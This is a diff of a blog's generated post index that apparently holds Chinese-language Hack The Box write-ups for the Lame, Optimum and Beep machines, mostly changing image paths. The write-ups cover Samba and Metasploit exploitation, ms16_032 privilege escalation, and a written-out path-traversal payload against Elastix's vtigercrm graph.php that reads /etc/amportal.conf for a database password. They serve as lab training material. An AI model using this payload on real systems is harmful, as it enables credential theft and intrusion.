-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.pqewsqaqkaeb{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="pqewsqaqkaeb" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.paertcdesrmf{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201155450222.png" class="paertcdesrmf" alt="Nmap">
 
-<p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/image-20250201160141376.png" alt="searchploit"></p>
+<p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/posts/465d4de8/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.fsmemtvmjbsn{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="fsmemtvmjbsn" alt="msfconsole">
+<style>.gqesrrpkydxk{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201174838005.png" class="gqesrrpkydxk" alt="msfconsole">
 
-<p><img src="/image-20250201175040335.png" alt="searchsploit"></p>
-<p><img src="/image-20250201175515940.png" alt="GetShell"></p>
+<img src="/posts/465d4de8/image-20250201175040335.png" class="" title="searchsploit">
+
+<img src="/posts/465d4de8/image-20250201175515940.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -4093,8 +4289,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Optimum</title>
-    <url>/Hackthebox/htb/htb-optimum/</url>
-    <content><![CDATA[<style>.coibinmrbxtt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="coibinmrbxtt">
+    <url>/posts/f7bd0d80.html</url>
+    <content><![CDATA[<style>.vmrnrwidpfqo{zoom:50%;}</style><img src="/posts/f7bd0d80/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="vmrnrwidpfqo">
 
 <span id="more"></span>
 
@@ -4110,17 +4306,25 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250202180408340.png" alt="nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/f7bd0d80/image-20250202180408340.png" class="" title="nmap">
+
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问目标</p>
-<p><img src="/image-20250203223205864.png" alt="获取版本信息"></p>
+<img src="/posts/f7bd0d80/image-20250203223205864.png" class="" title="获取版本信息">
+
 <p>使用searchsploit 检索可利用漏洞，发现目标可能存在RCE</p>
-<p><img src="/image-20250203223259584.png" alt="searchsploit"></p>
+<img src="/posts/f7bd0d80/image-20250203223259584.png" class="" title="searchsploit">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole进行漏洞利用</p>
-<p><img src="/image-20250203223401263.png" alt="漏洞利用"></p>
+<img src="/posts/f7bd0d80/image-20250203223401263.png" class="" title="漏洞利用">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>post/multi/recon/local_exploit_suggester</code>检测下当前系统可利用的提权漏洞</p>
-<p><img src="/image-20250203223426591.png" alt="收集信息"></p>
+<img src="/posts/f7bd0d80/image-20250203223426591.png" class="" title="收集信息">
+
 <p>根据结果使用ms16_032 进行权限提升</p>
-<p><img src="/image-20250202185340241.png" alt="提权"></p>
+<img src="/posts/f7bd0d80/image-20250202185340241.png" class="" title="提权">
+
+
+
 <table>
 <thead>
 <tr>
@@ -4147,8 +4351,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Beep</title>
-    <url>/Hackthebox/htb/htb-beep/</url>
-    <content><![CDATA[<style>.vmadcriaincj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="vmadcriaincj">
+    <url>/posts/48ffce4.html</url>
+    <content><![CDATA[<style>.ktlmlqjatuty{zoom:50%;}</style><img src="/posts/48ffce4/995f465295b99869fce21ecadea4604c.png" class="ktlmlqjatuty">
 
 <span id="more"></span>
 
@@ -4164,16 +4368,21 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250202162932802.png" alt="nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/48ffce4/image-20250202162932802.png" class="" title="nmap">
+
 <p>添加映射</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.10.7  beep.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/hosts</code></pre>
 
 <p>访问<span class="exturl" data-url="aHR0cHM6Ly9iZWVwLmh0Yi8=">https://beep.htb<i class="fa fa-external-link-alt"></i></span> 发现新版火狐浏览器不支持低版本SSL，修改浏览器配置，地址栏输入<code>about:config</code> , 输入<code>security.tls.version.min</code> 修改值为1 </p>
-<p><img src="/image-20250202170324934.png" alt="修改火狐配置"></p>
-<p><img src="/image-20250202170450821.png" alt="访问目标"></p>
+<img src="/posts/48ffce4/image-20250202170324934.png" class="" title="修改火狐配置">
+
+<img src="/posts/48ffce4/image-20250202170450821.png" class="" title="访问目标">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索Elastix ，查看<code>37637.pl</code> ,获取到payload：<code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>   搜索关键字 “AMPDBPASS” 获取到密码</p>
-<p><img src="/image-20250202171030333.png" alt="searchsploit"></p>
-<p><img src="/image-20250202172215531.png" alt="payload"></p>
+<img src="/posts/48ffce4/image-20250202171030333.png" class="" title="searchsploit">
+
+<img src="/posts/48ffce4/image-20250202172215531.png" class="" title="payload">
+
 <p>使用获取到的密码进行ssh登录，发现算法不支持，修改一下本地配置：编辑 ~&#x2F;.ssh&#x2F;config 添加</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">Host *
   Ciphers +aes128-cbc
@@ -4181,9 +4390,12 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   HostKeyAlgorithms +ssh-rsa
 </code></pre>
 
-<p><img src="/image-20250202172249979.png" alt="ssh"></p>
-<p><img src="/image-20250202172514124.png" alt="修改ssh配置"></p>
-<p><img src="/image-20250203203836733.png" alt="ssh访问"></p>
+<img src="/posts/48ffce4/image-20250202172249979.png" class="" title="ssh">
+
+<img src="/posts/48ffce4/image-20250202172514124.png" class="" title="修改ssh配置">
+
+<img src="/posts/48ffce4/image-20250203203836733.png" class="" title="ssh访问">
+
 <table>
 <thead>
 <tr>
